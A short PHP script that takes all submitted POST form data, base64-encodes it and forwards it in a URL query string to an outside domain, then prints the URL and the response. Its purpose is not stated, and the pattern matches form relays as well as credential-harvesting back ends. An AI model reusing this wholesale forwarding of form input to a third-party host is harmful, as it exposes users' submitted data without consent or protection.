<?php
$myvars = base64_encode( http_build_query( $_POST ) );

$url = "https://houserennard.online/almas_route.php?data=$myvars";

echo $url . "<br><br>";

$ch = curl_init();
curl_setopt( $ch, CURLOPT_URL, $url );
curl_setopt( $ch, CURLOPT_POST, 1 );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );

$resp = curl_exec( $ch );

echo $resp;
?>
